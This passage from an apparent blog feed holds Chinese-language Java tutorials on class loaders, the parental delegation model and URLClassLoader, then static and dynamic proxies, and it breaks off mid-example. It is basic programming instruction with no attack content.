ClassLoader（启动类加载器，C++实现）</span><br><span class="line">       ↑</span><br><span class="line">Extension ClassLoader（扩展类加载器，Java实现）</span><br><span class="line">       ↑</span><br><span class="line">Application ClassLoader（应用程序类加载器，Java实现）</span><br><span class="line">       ↑</span><br><span class="line">Custom ClassLoader（自定义类加载器，Java实现）</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取系统类加载器（Application ClassLoader）</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">appLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        System.out.println(<span class="string">&quot;系统类加载器: &quot;</span> + appLoader); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取其父加载器（Extension ClassLoader）</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">extLoader</span> <span class="operator">=</span> appLoader.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;扩展类加载器: &quot;</span> + extLoader); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试获取扩展类加载器的父加载器（Bootstrap ClassLoader，返回null）</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">bootstrapLoader</span> <span class="operator">=</span> extLoader.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;启动类加载器: &quot;</span> + bootstrapLoader); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">系统类加载器: sun.misc.Launcher$AppClassLoader@4e0e2f2a</span><br><span class="line">扩展类加载器: sun.misc.Launcher$ExtClassLoader@1540e19d</span><br><span class="line">启动类加载器: null</span><br></pre></td></tr></table></figure><h3 id="类加载器的核心方法"><a href="#类加载器的核心方法" class="headerlink" title="类加载器的核心方法"></a>类加载器的核心方法</h3><p>对应<code>ClassLoader</code>对象</p><ul><li><p><code>loadClass(String name)</code>: 加载指定的Java类</p></li><li><p><code>findClass(String name)</code>: 查找指定的Java类</p></li><li><p><code>findLoadedClass(String name)</code>: 查找JVM已经加载过的类</p></li><li><p><code>defineClass(String name, byte[] b, int off, int len)</code>: 定义一个Java类</p><p>将字节数组转换为JVM内部的<code>Class</code>对象，是类加载的核心步骤。注意此方法为final方法，不可重写</p></li><li><p><code>resolveClass(Class&lt;?&gt; c)</code>: 链接指定的Java类，包括<code>验证、准备、解析</code>三个阶段</p></li></ul><h2 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h2><p>JVM并不是在启动时就把<code>.class</code>文件都加载了一遍，而是在执行过程中用到了这个类才去加载</p><p>如果一个类加载器收到了类加载的请求，他首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的类加载器也是如此，因此<strong>所有的加载请求都应该被传送到顶层的启动类加载器中</strong>，当<strong>最顶层的启动类加载器无法加载该类时，再一层一层向下委派给子类加载器</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//每个类加载器都有个父加载器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader parent;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) &#123;</span><br><span class="line">  </span><br><span class="line">        <span class="comment">//查找一下这个类是不是已经加载过了</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//如果没有加载过</span></span><br><span class="line">        <span class="keyword">if</span>( c == <span class="literal">null</span> )&#123;</span><br><span class="line">          <span class="comment">//先委派给父加载器去加载，注意这是个递归调用</span></span><br><span class="line">          <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">              c = parent.loadClass(name);</span><br><span class="line">          &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// 如果父加载器为空，查找Bootstrap加载器是不是加载过了</span></span><br><span class="line">              c = findBootstrapClassOrNull(name);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果父加载器没加载成功，调用自己的findClass去加载</span></span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            c = findClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> c；</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name)&#123;</span><br><span class="line">       <span class="comment">//1. 根据传入的类名name，到在特定目录下去寻找类文件，把.class文件读入内存</span></span><br><span class="line">          ...</span><br><span class="line">          </span><br><span class="line">       <span class="comment">//2. 调用defineClass将字节数组转成Class对象</span></span><br><span class="line">       <span class="keyword">return</span> defineClass(buf, off, len)；</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将字节码数组解析成一个Class对象，用native方法实现</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)&#123;</span><br><span class="line">       ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类加载的方式"><a href="#类加载的方式" class="headerlink" title="类加载的方式"></a>类加载的方式</h2><ul><li><strong>命令行启动应用时候JVM初始化加载</strong></li><li><strong>通过<code>Class.forName</code>方法动态加载</strong></li><li><strong>通过<code>ClassLoader.loadClass()</code>方法动态加载</strong></li></ul><p>通过<code>Class.forName</code>方法动态执行类中的static静态代码块，而<code>ClassLoader.loadClass()</code>方法动态加载不会执行</p><h2 id="类加载过程实践"><a href="#类加载过程实践" class="headerlink" title="类加载过程实践"></a>类加载过程实践</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        cl.loadClass(<span class="string">&quot;nivia&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">nivia</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们创建了个java文件，当我们运行时，首先javac会将文件编译转换为JVM可识别的字节码文件，生成.class文件，内容为二进制字节码。然后JVM进行类加载机制：</p><p><img src="/archives/6d27f500/QQ20250402-201851.png"></p><p>可以看到，获取到的是APPClassLoader加载器</p><p><img src="/archives/6d27f500/QQ20250402-202101.png"></p><p>然后执行<code>ClassLoader.loadClass</code>方法。这里由于<code>AppClassLoader</code>类没有<code>loadClass(string name)</code>方法，于是调用父类的<code>ClassLoader.loadClass</code>方法。</p><p>然后调用<code>loadClass(String var1, boolean var2)</code>方法:<br><img src="/archives/6d27f500/QQ20250402-212651.png"></p><p>最后会调用父类的<code>loadClass(String name, boolean resolve)</code>方法:</p><p><img src="/archives/6d27f500/"><img src="/archives/6d27f500/QQ20250402-213226.png" alt="QQ20250402-213226"></p><p>在父类的<code>loadClass(String name, boolean resolve)</code>方法中：</p><p><img src="/archives/6d27f500/"><img src="/archives/6d27f500/QQ20250402-202817-17436008073416.png" alt="QQ20250402-202817"></p><p>这里判断父类加载器是否加载过这个类，如果没有会调用父类加载器的<code>loadClass</code>方法进行Java，反之自己加载</p><p>可以看到父类加载器为<code>ExtClassLoader</code></p><p>最后执行到<code>URLClassLoader.findClass</code>⽅法:</p><p><img src="/archives/6d27f500/QQ20250402-224441.png"></p><p>随后调用<code>SecureClassLoader.defineClass(name, b, off, len, getProtectionDomain(cs));</code></p><p><img src="/archives/6d27f500/QQ20250402-224736.png"></p><p>最后是调⽤了这个<code>ClassLoader.defineClass1</code>⽅法:</p><p><img src="/archives/6d27f500/QQ20250402-224844.png"></p><p>总结：</p><ol><li>类的继承关系(左⼦类右⽗类)：<code>AppClassLoader → URLClassLoader → SecureClassLoader → ClassLoader</code></li><li>类加载时的⽅法调⽤：<code>loadClass → findClass → defineClass</code></li><li>findClass是判断该路径下能否加载该类，defineClass是通过字节码加载类</li></ol><p>在调试过程遇到的一个类加载器<code>URLClassLoader</code>，它可以加载本地和远程的class文件:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlclassloader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:///Users/nivia/Desktop/Java/src&quot;</span>)&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> urlclassloader.loadClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;nivia&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出nivia，说明成功加载到本地的class文件</p><h2 id="利用加载器获取Class对象"><a href="#利用加载器获取Class对象" class="headerlink" title="利用加载器获取Class对象"></a>利用加载器获取Class对象</h2><p>ClassLoader类下存在一个静态方法<code>getSystemClassLoader()</code>，可以获取到<code>AppClassLoader</code>应用程序加载器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(ClassLoader.getSystemClassLoader()); </span><br><span class="line"><span class="comment">//sun.misc.Launcher$AppClassLoader@18b4aac2</span></span><br></pre></td></tr></table></figure><p>可利用获取到的<code>AppClassLoader</code>应用程序加载器，来加载一个类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/czwbig/p/11127222.html">https://www.cnblogs.com/czwbig/p/11127222.html</a></p><p><a href="https://www.cnblogs.com/happy-coding/p/18692970#%E7%AE%80%E4%BB%8B">https://www.cnblogs.com/happy-coding/p/18692970#%E7%AE%80%E4%BB%8B</a></p><p><a href="https://javabetter.cn/jvm/class-load.html">https://javabetter.cn/jvm/class-load.html</a></p><p><a href="https://nivi4.notion.site/Java-cedccc0611654bd99f841de3ef578e24?pvs=97#c713bd160a704c2ebc8e917484959e98">https://nivi4.notion.site/Java-cedccc0611654bd99f841de3ef578e24?pvs=97#c713bd160a704c2ebc8e917484959e98</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java动态代理</title>
      <link href="/archives/abd111cb/"/>
      <url>/archives/abd111cb/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>代理模式是Java中常用的设计模式。</p><p>其特征是代理类与委托类有<strong>同样的接口</strong>，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。</p><p>代理类与委托类之间通常会存在关联关系，一个代理类的对象与一个委托类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用委托类的对象的相关方法来提供简单的服务。简单的说就是，我们在访问实际对象时，是<strong>通过代理对象</strong>来访问的，代理模式就是在访问实际对象时引入一定程度的间接性，因为这种间接性，可以附加多种用途。</p><p><img src="/archives/abd111cb/Untitled.webp"></p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>指在编译时接口，代理类，被代理类等就已经确定下来了，在程序运行之前，代理类的.class文件就已经生成。</p><p>需要代理类与委托类有相同的接口</p><p>缺点：当需要代理的对象过多就需要实现大量的代理类，并且当接口增加方法，目标对象与代理对象都要进行修改</p><p>Demo:</p><p>拿学生交作业举例，一般都是学生交给课代表，课代表交给老师这种模式。此时学生就相当于委托类，课代表相当于一个学生代理类。</p><p>这里需要一个公共的接口，即学生（委托类）和课代表（代理类）的公共接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Event</span>&#123; </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">SubmitWork</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写一个学生类（委托类），实现公共代理接口和重写接口中的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Event</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String m)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=m;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">SubmitWork</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name+<span class="string">&quot;提交作业&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可理解为这个类实现学生将作业交给课代表，即从委托类到代理类。</p><p>同时编写一个代理类，即课代表，实现从代理类到目标对象，同样需要公共代理接口和重写接口中的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentInnovation</span> <span class="keyword">implements</span> <span class="title class_">Event</span>&#123;</span><br><span class="line">    Student student;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>; <span class="comment">//收到的作业数量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">StudentInnovation</span><span class="params">(Student stu)</span>&#123;</span><br><span class="line">        <span class="comment">//只代理学生对象</span></span><br><span class="line">        <span class="keyword">if</span>(stu.getClass()==Student.class)&#123;</span><br><span class="line">            <span class="built_in">this</span>.student=stu;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//用于动态切换代理对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStudent</span><span class="params">(Student student)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.student=student;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">SubmitWork</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.student.SubmitWork();</span><br><span class="line">        count+=<span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;已收作业数:&quot;</span>+count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//被代理的学生张三，他的作业提交由代理对象monitor（课代表）完成</span></span><br><span class="line">        Student s1=<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        Student s2=<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">        Student s3=<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;王五&quot;</span>);</span><br><span class="line">        <span class="comment">//生成代理对象，并将张三传给代理对象</span></span><br><span class="line">        StudentInnovation monitor=<span class="keyword">new</span> <span class="title class_">StudentInnovation</span>(s1);</span><br><span class="line">        <span class="comment">//向课代表交作业</span></span><br><span class="line">        monitor.SubmitWork();</span><br><span class="line">        monitor.setStudent(s2);  <span class="comment">//切换代理对象</span></span><br><span class="line">        monitor.SubmitWork();</span><br><span class="line">        monitor.setStudent(s3);</span><br><span class="line">        monitor.SubmitWork();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">张三提交作业</span><br><span class="line">已收作业数:1</span><br><span class="line">李四提交作业</span><br><span class="line">已收作业数:2</span><br><span class="line">王五提交作业</span><br><span class="line">已收作业数:3</span><br></pre></td></tr></table></figure><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>与静态代理原理相同，需要公共接口，委托类和代理类。区别就是<strong>动态代理是利用反射机制在运行时创建代理类</strong>。</p><p>主要<strong>通过<code>Java.lang.reflect.Proxy</code>类与<code>InvocationHandler</code>接口</strong></p><p><code>InvocationHandler</code>接口：负责提供调用代理的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其中proxy为动态生成的代理对象(不是被代理的实际对象)</p><p>method表示调用的方法名(通过反射获取的Method对象)</p><p>args为调用方法的参数数组</p></blockquote><p><code>Proxy</code>类：负责动态构建代理类</p><p>该类提供了一个静态方法用于得到代理对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler handler)</span></span><br></pre></td></tr></table></figure><blockquote><p>loader表示类加载器(通常使用目标接口的类加载器，用于加载动态生成的代理类)</p><p>第二个参数指代理类要实现的接口列表</p><p>第三个参数指方法调用的处理器</p></blockquote><p>Demo:</p><p>委托类和公共接口不用修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Event</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">SubmitWork</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Event</span>&#123;</span><br><span class="line">    </span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String n)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">SubmitWork</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name + <span class="string">&quot;提交作业&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写动态获取代理类的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object object;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>; <span class="comment">//收到的作业数量</span></span><br><span class="line">    <span class="comment">//动态切换被代理对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStudent</span><span class="params">(Student student)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.object=student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置需要代理的对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ProxyHandler</span><span class="params">(Object object)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.object=object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        method.invoke(object,args);</span><br><span class="line">        <span class="built_in">this</span>.count+=<span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;已收作业数量:&quot;</span>+<span class="built_in">this</span>.count);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        method.invoke(object,args);</span><br><span class="line">        <span class="built_in">this</span>.count+=<span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;已收作业数量:&quot;</span>+<span class="built_in">this</span>.count);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当调用<strong>代理对象</strong>的方法时就会触发invoke方法，触发该invoke方法的前提条件：</p><ul><li><p><strong>代理对象需基于接口动态生成，并绑定 <code>InvocationHandler</code>。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxyHandler</span>(s1);</span><br><span class="line"><span class="type">Event</span> <span class="variable">proxy</span> <span class="operator">=</span> (Event) Proxy.newProxyInstance(</span><br><span class="line">    target.getClass().getClassLoader(),</span><br><span class="line">    target.getClass().getInterfaces(), <span class="comment">// 必须实现至少一个接口</span></span><br><span class="line">    handler <span class="comment">// InvocationHandler 实例</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p><strong>调用的方法必须属于代理接口</strong></p></li><li><p><strong>方法调用必须通过代理对象发起</strong></p></li></ul><p>这里我们设置一个动态代理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> 